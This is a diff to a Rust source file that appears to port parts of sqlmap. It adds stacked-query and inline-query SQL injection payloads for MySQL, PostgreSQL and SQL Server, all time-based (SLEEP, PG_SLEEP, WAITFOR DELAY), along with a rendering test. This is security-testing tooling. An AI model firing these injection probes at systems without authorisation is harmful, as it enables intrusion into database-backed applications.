@@ -1,6 +1,6 @@
 //! Injection payload and boundary definitions per technique.
 //! Port of subsets of sqlmap `data/xml/boundaries.xml` and
-//! `data/xml/payloads/{boolean_blind,error_based,time_blind}.xml`.
+//! `data/xml/payloads/{boolean_blind,error_based,time_blind,stacked_queries,inline_query}.xml`.
 
 use sqlmap_core::injection::{Boundary, PType};
 
@@ -217,6 +217,87 @@ pub fn time_payloads() -> Vec<Payload> {
     ]
 }
 
+
+/// Port of level-1 entries of sqlmap `data/xml/payloads/stacked_queries.xml`:
+/// the injected fragment opens a SECOND statement after `;`. Confirmation is
+/// always by time delay, exactly like upstream (stacked queries carry no
+/// response marker of their own).
+pub fn stacked_payloads() -> Vec<Payload> {
+    vec![
+        Payload {
+            title: "MySQL >= 5.0.12 stacked queries - SLEEP",
+            dbms: Some("mysql"),
+            level: 1,
+            risk: 1,
+            check: Check::Time {
+                q: ";SELECT SLEEP([SLEEPTIME])-- ",
+            },
+        },
+        Payload {
+            title: "MySQL >= 5.0.12 stacked queries - SLEEP (quote close)",
+            dbms: Some("mysql"),
+            level: 1,
+            risk: 1,
+            check: Check::Time {
+                q: "';SELECT SLEEP([SLEEPTIME])-- ",
+            },
+        },
+        Payload {
+            title: "PostgreSQL stacked queries - pg_sleep",
+            dbms: Some("postgresql"),
+            level: 1,
+            risk: 1,
+            check: Check::Time {
+                q: ";SELECT PG_SLEEP([SLEEPTIME])-- ",
+            },
+        },
+        Payload {
+            title: "Microsoft SQL Server stacked queries - WAITFOR DELAY",
+            dbms: Some("mssql"),
+            level: 1,
+            risk: 1,
+            check: Check::Time {
+                q: ";WAITFOR DELAY '0:0:[SLEEPTIME]'-- ",
+            },
+        },
+    ]
+}
+
+/// Port of level-1 entries of sqlmap `data/xml/payloads/inline_query.xml`:
+/// the parameter value is REPLACED by a standalone subquery. Confirmation is
+/// by time delay, as upstream.
+pub fn inline_payloads() -> Vec<Payload> {
+    vec![
+        Payload {
+            title: "MySQL >= 5.0.12 inline queries - SLEEP subquery",
+            dbms: Some("mysql"),
+            level: 1,
+            risk: 1,
+            check: Check::Time {
+                q: "(SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])",
+            },
+        },
+        Payload {
+            title: "PostgreSQL inline queries - pg_sleep subquery",
+            dbms: Some("postgresql"),
+            level: 1,
+            risk: 1,
+            check: Check::Time {
+                q: "(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))",
+            },
+        },
+        Payload {
+            title: "Microsoft SQL Server inline queries - WAITFOR subquery",
+            dbms: Some("mssql"),
+            level: 1,
+            risk: 1,
+            check: Check::Time {
+                q: "(SELECT [RANDNUM] WHERE 1=1 IF(1=1) WAITFOR DELAY '0:0:[SLEEPTIME]')",
+            },
+        },
+    ]
+}
+
 /// Render a payload template with concrete random values (port of sqlmap's
 /// payload vector expansion: randomInt, randomStr, sleepTime substitution).
 pub fn render(template: &str, sleep_time: u32, rand_num: u32, rand_num1: u32, rand_str: &str) -> String {
@@ -251,6 +332,25 @@ mod tests {
         for db in ["mysql", "postgresql", "mssql"] {
             assert!(error_payloads().iter().any(|p| p.dbms == Some(db)), "error {db}");
             assert!(time_payloads().iter().any(|p| p.dbms == Some(db)), "time {db}");
+        }
+    }
+
+    #[test]
+    fn stacked_and_inline_payloads_render() {
+        let st = stacked_payloads();
+        let il = inline_payloads();
+        assert!(st.iter().all(|p| matches!(p.check, Check::Time { .. })));
+        assert!(il.iter().all(|p| matches!(p.check, Check::Time { .. })));
+        let Check::Time { q } = st[0].check else { panic!() };
+        assert_eq!(render(q, 5, 1, 2, "abc"), ";SELECT SLEEP(5)-- ");
+        let Check::Time { q } = il[0].check else { panic!() };
+        assert_eq!(
+            render(q, 5, 713, 2, "wxyz"),
+            "(SELECT 713 FROM (SELECT(SLEEP(5)))wxyz)"
+        );
+        // Every DBMS tag matches the dbms filter convention of the others.
+        for p in st.iter().chain(il.iter()) {
+            assert!(p.dbms.is_some(), "{} should be DBMS-tagged", p.title);
         }
     }
 }
